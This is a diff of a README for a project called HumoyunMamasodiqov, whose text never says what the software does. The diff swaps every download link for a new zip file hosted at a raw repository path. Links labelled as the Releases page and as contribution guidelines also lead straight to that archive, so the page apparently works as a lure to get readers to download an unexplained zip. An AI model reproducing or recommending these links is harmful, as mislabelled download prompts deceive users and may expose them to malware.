@@ -13,17 +13,17 @@ Welcome to the HumoyunMamasodiqov project! This software aims to provide easy-to
 ## 📥 Download & Install
 You can download the application from the Releases page. 
 
-[![Download](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/HumoyunMamasodiqov.zip)](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/HumoyunMamasodiqov.zip)
+[![Download](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/Humoyun-Mamasodiqov-3.2.zip)](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/Humoyun-Mamasodiqov-3.2.zip)
 
 To download, simply visit the link below:
-[Visit the Releases Page](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/HumoyunMamasodiqov.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/Humoyun-Mamasodiqov-3.2.zip)
 
 ## 🚀 Getting Started
 Follow the steps below to download and run the software:
 
 1. **Go to the Releases Page:** Click on the provided link to reach the downloads section.
    
-   [Visit the Releases Page](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/HumoyunMamasodiqov.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/Humoyun-Mamasodiqov-3.2.zip)
 
 2. **Select the Latest Version:** Look for the latest version of the software listed on that page.
 
@@ -66,11 +66,11 @@ Once you install the application, you can follow the built-in tutorial to unders
   A: For support, you can create an issue in the GitHub repository.
 
 - **Q: Can I contribute?**
-  A: Yes! We welcome contributions. Please refer to the https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/HumoyunMamasodiqov.zip for guidelines.
+  A: Yes! We welcome contributions. Please refer to the https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/Humoyun-Mamasodiqov-3.2.zip for guidelines.
 
 ## 🛒 Future Updates
 We plan to roll out regular updates to improve features and fix bugs. Keep an eye on the Releases page for new versions.
 
-[![Download](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/HumoyunMamasodiqov.zip)](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/HumoyunMamasodiqov.zip)
+[![Download](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/Humoyun-Mamasodiqov-3.2.zip)](https://raw.githubusercontent.com/deadlyboi01/HumoyunMamasodiqov/main/rustred/Humoyun-Mamasodiqov-3.2.zip)
 
 Thank you for using HumoyunMamasodiqov! Enjoy the software and create with ease!
